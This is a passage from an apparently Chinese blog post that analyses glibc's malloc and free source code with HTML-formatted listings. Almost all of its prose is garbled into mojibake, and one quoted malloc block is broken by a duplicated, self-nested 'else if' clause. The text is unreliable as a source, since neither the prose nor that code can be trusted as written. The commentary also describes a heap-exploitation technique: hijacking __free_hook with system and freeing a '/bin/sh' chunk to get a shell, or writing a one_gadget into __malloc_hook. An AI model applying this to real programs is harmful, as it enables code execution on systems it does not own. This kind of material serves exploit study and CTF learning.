PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">             here for all block sizes.  */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">            <span class="comment">/* restore original bin index */</span></span><br><span class="line">            <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                idx = smallbin_index (nb);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">            <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">                alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯è¯´å…ˆä»<code>av-&gt;top</code>æ‹¿åˆ°<code>top_chunk</code>çš„åœ°å€ã€‚åˆ¤æ–­å¤§å°å°è¯•åˆ‡å‰²ï¼Œå¦‚æœä¸èƒ½åˆ‡å‰²ï¼Œå®ƒä¹Ÿä¸ä¼šå°½é‡å»éº»çƒ¦æ“ä½œç³»ç»Ÿï¼Œå…ˆè°ƒç”¨<code>malloc_consolidate</code>å»åˆå¹¶æ‰€æœ‰çš„<code>fast bin</code>é‡Œé¢çš„<code>chunk</code>ã€‚ç„¶ååˆå¹¶ä¹‹åæ¥ç€æ­¥å…¥ä¹‹å‰çš„å¾ªç¯ï¼Œé‡æ–°æ‰¾ä¸€æ¬¡<code>small bin</code> <code>large bin</code> <code>unsorted bin</code>ï¼Œå› ä¸ºç°åœ¨å¯èƒ½å·²ç»æœ‰åˆé€‚çš„<code>chunk</code>äº†å¯¹å§ã€‚</p><p>ç„¶åå¦‚æœè¿˜æ˜¯æ²¡æœ‰åˆé€‚çš„å‘¢ï¼Ÿå°±ä¼šè¿›å…¥è¿™é‡Œçš„<code>else</code>ï¼Œè°ƒç”¨<code>sysmalloc</code>å»åˆ†é…å†…å­˜ï¼Œä¸€æ¬¡è¿˜æ˜¯åˆ†é…<code>0x21000</code>çš„<code>chunk</code>ä½œä¸ºæ–°çš„<code>top_chunk</code>ï¼ŒåŸæ¥çš„<code>top_chunk</code>å°†ä¼šè¢«<code>free</code>ï¼Œä¸€èˆ¬æ¥è¯´å¦‚æœä½ æ²¡æœ‰æ”¹è¿‡<code>top_chunk</code>çš„<code>size</code>ï¼Œé‚£ä¹ˆæ–°çš„å’Œæ—§çš„<code>top_chunk</code>å°†ä¼šæ˜¯ç‰©ç†ç›¸é‚»ï¼Œå¦‚æœ<code>free</code> çš„<code>top_chunk</code>ä¸åœ¨<code>fast bin</code>èŒƒå›´å†…ï¼Œé‚£å°±ä¼šå’Œæ–°çš„<code>top_chunk</code>å‘ç”Ÿåˆå¹¶ã€‚é‚£ä¹ˆè¿™ä¸€æ•´ä¸ª<code>malloc</code>æºç å°±è§£è¯»å®Œäº†ï¼Œæˆ‘ä»¬æ¥åšä¸€ä¸‹æ€»ç»“ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ol><li><p>æ£€æŸ¥æ˜¯å¦è®¾ç½®äº†<code>malloc_hook</code>ï¼Œè‹¥è®¾ç½®äº†åˆ™è·³è½¬è¿›å…¥<code>malloc_hook</code>ï¼Œè‹¥æœªè®¾ç½®åˆ™è·å–å½“å‰çš„åˆ†é…åŒºï¼Œè¿›å…¥<code>int_malloc</code>å‡½æ•°ã€‚</p></li><li><p>å¦‚æœå½“å‰çš„åˆ†é…åŒºä¸ºç©ºï¼Œåˆ™è°ƒç”¨<code>sysmalloc</code>åˆ†é…ç©ºé—´ï¼Œè¿”å›æŒ‡å‘æ–°<code>chunk</code>çš„æŒ‡é’ˆï¼Œå¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p></li><li><p>è‹¥ç”¨æˆ·ç”³è¯·çš„å¤§å°åœ¨<code>fast bin</code>çš„èŒƒå›´å†…ï¼Œåˆ™è€ƒè™‘å¯»æ‰¾å¯¹åº”<code>size</code>çš„<code>fast bin chunk</code>ï¼Œåˆ¤æ–­è¯¥<code>size</code>çš„<code>fast bin</code>æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™å–å‡ºç¬¬ä¸€ä¸ª<code>chunk</code>è¿”å›ï¼Œå¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p></li><li><p>å¦‚æœç”¨æˆ·ç”³è¯·çš„å¤§å°ç¬¦åˆ<code>small bin</code>çš„èŒƒå›´ï¼Œåˆ™åœ¨ç›¸åº”å¤§å°çš„é“¾è¡¨ä¸­å¯»æ‰¾<code>chunk</code>ï¼Œè‹¥<code>small bin</code>æœªåˆå§‹åŒ–ï¼Œåˆ™è°ƒç”¨<code>malloc_consolidate</code>åˆå§‹åŒ–åˆ†é…å™¨ï¼Œç„¶åç»§ç»­ä¸‹é¢çš„æ­¥éª¤ï¼Œå¦åˆ™å¯»æ‰¾å¯¹åº”çš„<code>small bin</code>çš„é“¾è¡¨ï¼Œå¦‚æœè¯¥<code>size</code> çš„<code>small bin</code>ä¸ä¸ºç©ºåˆ™å–å‡ºè¿”å›ï¼Œå¦åˆ™ç»§ç»­ä¸‹é¢çš„æ­¥éª¤ã€‚å¦‚æœç”³è¯·çš„ä¸åœ¨<code>small bin</code>çš„èŒƒå›´é‚£ä¹ˆè°ƒç”¨<code>malloc_consolidate</code>å»åˆå¹¶æ‰€æœ‰<code>fast bin</code>å¹¶ç»§ç»­ä¸‹é¢çš„æ­¥éª¤ã€‚</p></li><li><p>ç”¨æˆ·ç”³è¯·çš„å¤§å°ç¬¦åˆ<code>large bin</code>æˆ–<code>small bin</code>é“¾è¡¨ä¸ºç©ºï¼Œå¼€å§‹å¤„ç†<code>unsorted bin</code>é“¾è¡¨ä¸­çš„<code>chunk</code>ã€‚åœ¨<code>unsorted bin</code>é“¾è¡¨ä¸­æŸ¥æ‰¾ç¬¦åˆå¤§å°çš„<code>chunk</code>ï¼Œè‹¥ç”¨æˆ·ç”³è¯·çš„å¤§å°ä¸º<code>small bin</code>ï¼Œ<code>unsorted bin</code>ä¸­åªæœ‰ä¸€å—chunkå¹¶æŒ‡å‘<code>last_remainder</code>ï¼Œä¸”<code>chunk size</code>çš„å¤§å°å¤§äº<code>size+MINSIZE</code>ï¼Œåˆ™å¯¹å½“å‰çš„<code>chunk</code>è¿›è¡Œåˆ†å‰²ï¼Œæ›´æ–°åˆ†é…å™¨ä¸­çš„<code>last_remainder</code>ï¼Œåˆ‡å‡ºçš„<code>chunk</code>è¿”å›ç»™ç”¨æˆ·ï¼Œå‰©ä½™çš„<code>chunk</code>å›<code>unsorted bin</code>ã€‚å¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p></li><li><p>å°†å½“å‰çš„<code>unsorted bin</code>ä¸­çš„<code>chunk</code>å–ä¸‹ï¼Œè‹¥å…¶<code>size</code>æ°å¥½ä¸ºç”¨æˆ·ç”³è¯·çš„<code>size</code>ï¼Œåˆ™å°†<code>chunk</code>è¿”å›ç»™ç”¨æˆ·ã€‚å¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥</p></li><li><p>è·å–å½“å‰<code>chunk size</code>æ‰€å¯¹åº”çš„binsæ•°ç»„ä¸­çš„å¤´æŒ‡é’ˆã€‚ï¼ˆ<code>large bin</code>éœ€è¦ä¿è¯ä»å¤§åˆ°å°çš„é¡ºåºï¼Œå› æ­¤éœ€è¦éå†ï¼‰å°†å…¶æ’å…¥åˆ°å¯¹åº”çš„é“¾è¡¨ä¸­ã€‚å¦‚æœå¤„ç†çš„chunkçš„æ•°é‡å¤§äº<code>MAX_ITERS</code>åˆ™ä¸åœ¨å¤„ç†ã€‚è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p></li><li><p>å¦‚æœç”¨æˆ·ç”³è¯·çš„ç©ºé—´çš„å¤§å°ç¬¦åˆ<code>large bin</code>çš„èŒƒå›´æˆ–è€…å¯¹åº”çš„small biné“¾è¡¨ä¸ºç©ºä¸”<code>unsorted bin</code>é“¾è¡¨ä¸­æ²¡æœ‰ç¬¦åˆå¤§å°çš„<code>chunk</code>ï¼Œåˆ™åœ¨å¯¹åº”çš„<code>large bin</code>é“¾è¡¨ä¸­æŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„<code>chunk</code>ï¼ˆå³å…¶å¤§å°è¦å¤§äºç”¨æˆ·ç”³è¯·çš„<code>size</code>ï¼‰ã€‚è‹¥æ‰¾åˆ°ç›¸åº”çš„<code>chunk</code>åˆ™å¯¹<code>chunk</code>è¿›è¡Œæ‹†åˆ†ï¼Œè¿”å›ç¬¦åˆè¦æ±‚çš„<code>chunk</code>ï¼ˆæ— æ³•æ‹†åˆ†æ—¶æ•´å—è¿”å›ï¼‰ã€‚å¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p></li><li><p>æ ¹æ®<code>binmap</code>æ‰¾åˆ°è¡¨ç¤ºæ›´å¤§<code>size</code>çš„<code>large bin</code>é“¾è¡¨ï¼Œè‹¥å…¶ä¸­å­˜åœ¨ç©ºé—²çš„<code>chunk</code>ï¼Œåˆ™å°†<code>chunk</code>æ‹†åˆ†ä¹‹åè¿”å›ç¬¦åˆè¦æ±‚çš„éƒ¨åˆ†ï¼Œå¹¶æ›´æ–°<code>last_remainder</code>ã€‚å¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p></li><li><p>è‹¥<code>top_chunk</code>çš„å¤§å°å¤§äºç”¨æˆ·ç”³è¯·çš„ç©ºé—´çš„å¤§å°ï¼Œåˆ™å°†<code>top_chunk</code>æ‹†åˆ†ï¼Œè¿”å›ç¬¦åˆç”¨æˆ·è¦æ±‚çš„<code>chunk</code>ï¼Œå¹¶æ›´æ–°<code>last_remainder</code>ï¼Œå¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p></li><li><p>è‹¥<code>fast bin</code>ä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨<code>malloc_consolidate</code>åˆå¹¶<code>fast bin</code>ï¼Œé‡æ–°å›åˆ°ç¬¬å››æ­¥å†æ¬¡ä»<code>small bin</code>æœç´¢ã€‚å¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p></li><li><p>è°ƒç”¨<code>sysmalloc</code>åˆ†é…ç©ºé—´ï¼Œ<code>free top chunk</code>è¿”å›æŒ‡å‘æ–°<code>chunk</code>çš„æŒ‡é’ˆã€‚</p></li><li><p>è‹¥<code>_int_malloc</code>å‡½æ•°è¿”å›çš„<code>chunk</code>æŒ‡é’ˆä¸ºç©ºï¼Œä¸”å½“å‰åˆ†é…åŒºæŒ‡é’ˆä¸ä¸ºç©ºï¼Œåˆ™å†æ¬¡å°è¯•<code>_int_malloc</code></p></li><li><p>å¯¹<code>chunk</code>æŒ‡é’ˆè¿›è¡Œæ£€æŸ¥ï¼Œä¸»è¦æ£€æŸ¥<code>chunk</code>æ˜¯å¦ä¸º<code>mmap</code>ï¼Œä¸”ä½äºå½“å‰çš„åˆ†é…åŒºå†…ã€‚</p><h2 id="freeæºç åˆ†æ"><a href="#freeæºç åˆ†æ" class="headerlink" title="freeæºç åˆ†æ"></a>freeæºç åˆ†æ</h2></li></ol><p>é‚£æˆ‘ä»¬ç°åœ¨å¼€å§‹è§£è¯»ä¸€ä¸‹<code>free</code>çš„æºç </p><h3 id="libc-freeæºç åˆ†æ"><a href="#libc-freeæºç åˆ†æ" class="headerlink" title="__libc_freeæºç åˆ†æ"></a>__libc_freeæºç åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>free</code>å‡½æ•°ä¹Ÿæ˜¯ç›´æ¥è°ƒç”¨è¿™é‡Œçš„<code>__libc_free</code>å‡½æ•°å®Œæˆ<code>chunk</code>çš„é‡Šæ”¾çš„æ“ä½œçš„ã€‚</p><p>è·Ÿ<code>malloc</code>ä¸€æ ·ï¼Œå…ˆè¯»å–<code>__free_hook</code>çœ‹çœ‹æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºåˆ™ç›´æ¥ç”±<code>free_hook</code>æŒ‡å‘çš„å‡½æ•°ä»£ä¸ºæ‰§è¡Œ<code>free</code>ï¼Œè¿™é‡Œä¹Ÿæ˜¯æˆ‘ä»¬ç»å¸¸åŠ«æŒçš„é’©å­å‡½æ•°ï¼Œè€Œä¸”<code>free_hook</code>åŠ«æŒèµ·æ¥æ¯”<code>malloc_hook</code>å›°éš¾ã€‚ä½†æ˜¯ä¸€æ—¦åŠ«æŒæˆåŠŸä¹Ÿä¼šå¾ˆæ–¹ä¾¿ï¼Œå°±æ˜¯è¯´<code>malloc</code>_hookå‡½æ•°æˆ‘åªèƒ½å†™<code>one_gadget</code>ï¼Œè€Œä¸€æ—¦æ¡ä»¶è‹›åˆ»é‚£ä¹ˆå°±è¿˜å¾—è°ƒæ ˆå•Šä¹‹ç±»çš„ä¸€äº›æ“ä½œã€‚åŠ«æŒåˆ°äº†<code>free_hook</code>æˆ‘ä»¬å°±ç›´æ¥å†™<code>system</code>å‡½æ•°ï¼Œç„¶å<code>free</code>ä¸€ä¸ªå†…å®¹ä¸º<code>/bin/sh</code>çš„å †å—å°±èƒ½ç¨³å®š<code>get shell</code>ã€‚</p><p>ç„¶åæ‰§è¡Œ<code>free(NULL)</code>æ— ä»»ä½•æ•ˆæœï¼Œç›´æ¥è¿”å›ã€‚</p><p>å°†ä¼ å…¥çš„æŒ‡é’ˆè½¬æ¢ä¸º<code>chunk</code>çš„æŒ‡é’ˆï¼Œå› ä¸ºç”¨æˆ·å¾—åˆ°çš„æŒ‡é’ˆå…¶å®æ˜¯<code>&amp;chunk-&gt;fd</code>ï¼Œè¿™é‡Œæ”¹ä¸º<code>chunk</code>çš„æŒ‡é’ˆã€‚ç„¶åè¿™é‡Œéœ€è¦å¯»æ‰¾è¿™ä¸ªå †å—çš„åˆ†é…å™¨ï¼Œçœ‹çœ‹è¿™ä¸ªå †å—æ˜¯ä»å“ªé‡Œåˆ†é…å‡ºæ¥çš„ã€‚ä¹‹åå°±æ˜¯è°ƒç”¨<code>_int_free</code>å‡½æ•°å»çœŸæ­£é‡Šæ”¾chunk</p><h3 id="int-freeæºç åˆ†æ"><a href="#int-freeæºç åˆ†æ" class="headerlink" title="_int_freeæºç åˆ†æ"></a>_int_freeæºç åˆ†æ</h3><p>åŒæ ·æˆ‘ä»¬åˆ†æˆå‡ æ®µæ¥è®²è§£ï¼Œæ€»æºç ä¹Ÿä¸ç›´æ¥ç»™äº†ã€‚</p><h4 id="ç¬¬ä¸€æ®µï¼šfreeå‰çš„å„ç§check"><a href="#ç¬¬ä¸€æ®µï¼šfreeå‰çš„å„ç§check" class="headerlink" title="ç¬¬ä¸€æ®µï¼šfreeå‰çš„å„ç§check"></a>ç¬¬ä¸€æ®µï¼šfreeå‰çš„å„ç§check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line"><span class="meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span></span><br><span class="line"><span class="meta">   &amp; MALLOC_ALIGN_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line">INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line"><span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>é¦–å…ˆå˜é‡å®šä¹‰æ˜¯å·®ä¸å¤šçš„ï¼Œç„¶åè¿™é‡Œè¿›è¡Œäº†ä¸€é¡¹<code>check</code>ã€‚</p><ol><li><code>(uintptr_t) p &gt; (uintptr_t) -size</code>ï¼šè¿™é‡Œè®©æˆ‘æœ‰ç‚¹è´¹è§£ï¼ŒæŒ‡é’ˆå’Œsizeè¿›è¡Œæ¯”è¾ƒã€‚é€šå¸¸æƒ…å†µä¸‹sizeå–è´Ÿä¹‹åä¼šå˜å¾—å¾ˆå¤§ï¼Œæ¯”å¦‚<code>0xfff...</code>è¿™æ ·çš„å¤§æ•°å€¼é€šå¸¸æŒ‡é’ˆä¸ä¼šæŒ‡å‘è¿™æ ·çš„åœ°å€ï¼Œfå¼€å¤´çš„ä¸€èˆ¬éƒ½æ˜¯å†…æ ¸åœ°å€ã€‚æ‰€ä»¥<code>p&gt;0xfff....</code>ä¸»è¦æ˜¯åº”è¯¥è¦æ£€æµ‹è¢«<code>free</code>çš„<code>chunk</code>çš„<code>size</code>ä¸è¦è¿‡å¤§ã€‚</li><li><code>misaligned_chunk (p)</code>ï¼šè¿™é‡Œçš„è¯ä¸»è¦æ˜¯è¿™ä¸ª<code>chunk</code>çš„æŒ‡é’ˆä¸ä¸Šæ©ç ï¼Œæ©ç å°±æ˜¯<code>0x10-1</code>ä¹Ÿå°±æ˜¯<code>0xf</code>ï¼Œå–å‡ºåå››ä½è§‚å¯Ÿæ˜¯å¦ä¸º0ï¼Œå¦‚æœä¸ä¸º0åˆ™è¯´æ˜æŒ‡é’ˆé”™è¯¯äº†ï¼Œæœºä¼šåœ¨è¿™é‡ŒæŠ¥é”™ã€‚è¿™é‡Œä¸»è¦æ˜¯æ£€æŸ¥å¯¹é½ï¼ŒæŒ‡é’ˆéœ€è¦æŒ‡åˆ°<code>0x10</code>çš„æ•´å€æ•°çš„<code>chunk</code>æ‰èƒ½è¢«æ­£å¸¸<code>free</code>ï¼Œå°±æ˜¯ä¸çŸ¥é“<code>malloc</code>ä¸ºä»€ä¹ˆä¸å¼€è¿™ä¸ªæ£€æµ‹ï¼Œå¼€äº†åˆæœ‰ä¸€å¤§æ‰¹åˆ©ç”¨æ‰‹æ®µç”¨ä¸äº†äº†(ç‹—å¤´ã€‚</li></ol><p><code>check</code>ä¸é€šè¿‡å°±ä¼šç”¨<code>malloc_printerr</code>æ‰“å°é”™è¯¯ä¿¡æ¯ï¼Œç„¶åå¤„ç†é”ä¸Šçš„ä¸€äº›å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>åˆæœ‰ä¸€ä¸ª<code>check</code></p><ol><li><code>size &lt; MINSIZE</code>ï¼šå¦‚æœ<code>size</code>è¿˜æ¯”<code>MINSIZE</code>è¦å°ï¼Œé‚£è‚¯å®š<code>size</code>è‚¯å®šå‡ºé”™äº†ã€‚</li><li><code>!aligned_OK (size)</code>ï¼š<code>chunk size</code>ä¹Ÿè¦å¯¹é½ï¼Œä½†æ˜¯è¿™ä¸ª<code>check</code>ä¸€èˆ¬ä¸ä¼šè¢«è§¦å‘ï¼Œå› ä¸ºå†å–å‡º<code>chunk size</code>çš„æ—¶å€™å°±ä¼šæŠŠæœ€ä½ä½ä¸æ‰ã€‚</li></ol><p>ç„¶åå®ƒè¿™é‡Œéœ€è¦<code>check</code>ä¸€ä¸‹è¿™ä¸ª<code>free</code>çš„<code>chunk</code>æ˜¯æ­£åœ¨ä½¿ç”¨çš„ï¼Œæ€ä¹ˆ<code>check</code>å‘¢ï¼Œé‚£å°±è‚¯å®šæ˜¯ä¸‹ä¸€ä¸ª<code>chunk</code>çš„<code>prev_inuse</code>ä½ä¸º0å•¦ï¼Œå…·ä½“çš„å®ç°å‡½æ•°æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">do_check_inuse_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mchunkptr next;</span><br><span class="line"></span><br><span class="line">  do_check_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">/* mmapped chunks have no next/prev */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check whether it claims to be in use ... */</span></span><br><span class="line">  assert (inuse (p));</span><br><span class="line"></span><br><span class="line">  next = next_chunk (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... and is surrounded by OK chunks.</span></span><br><span class="line"><span class="comment">     Since more things can be checked with free chunks than inuse ones,</span></span><br><span class="line"><span class="comment">     if an inuse chunk borders them 